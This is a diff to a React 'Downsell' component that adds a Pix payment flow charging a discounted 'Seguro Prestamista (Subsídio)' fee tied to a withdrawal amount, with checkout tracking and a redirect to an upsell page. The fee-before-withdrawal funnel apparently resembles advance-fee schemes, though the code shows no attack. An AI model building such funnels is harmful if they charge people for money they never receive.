@@ -125,12 +125,57 @@ const Downsell = () => {
     };
   }, []);
 
-  const handleCTA = () => {
+  const [showPix, setShowPix] = useState(false);
+  const [copied, setCopied] = useState(false);
+
+  const { create, reset, pix, loading: pixLoading, error: pixError } = useParadisePix(() => {
+    trackEvent({
+      event: "CompletePayment",
+      value: valorDesconto,
+      currency: "BRL",
+      contents: [{ content_id: "seguro_downsell", content_name: "Seguro Prestamista (Subsídio)", quantity: 1, price: valorDesconto }],
+    });
     const qs = new URLSearchParams(params);
     qs.set("valor", String(valorSaque));
     qs.set("downsell", "1");
-    qs.set("seguroValor", String(valorDesconto));
-    navigate(`/pagamento?${qs.toString()}`);
+    navigate(`/up1?${qs.toString()}`);
+  });
+
+  const handleCTA = async () => {
+    setShowPix(true);
+    trackEvent({
+      event: "InitiateCheckout",
+      value: valorDesconto,
+      currency: "BRL",
+      contents: [{ content_id: "seguro_downsell", content_name: "Seguro Prestamista (Subsídio)", quantity: 1, price: valorDesconto }],
+    });
+    try {
+      await create({
+        amountCents: Math.round(valorDesconto * 100),
+        description: `Seguro Prestamista - Subsídio 50% (${formatBRL(valorSaque)})`,
+        stage: "seguro",
+        customer: getFunnelCustomer(params),
+      });
+    } catch {
+      /* erro tratado pelo hook */
+    }
+  };
+
+  const closePix = () => {
+    setShowPix(false);
+    reset();
+    setCopied(false);
+  };
+
+  const handleCopy = async () => {
+    if (!pix?.qr_code) return;
+    try {
+      await navigator.clipboard.writeText(pix.qr_code);
+      setCopied(true);
+      setTimeout(() => setCopied(false), 2200);
+    } catch {
+      /* ignore */
+    }
   };
 
   return (
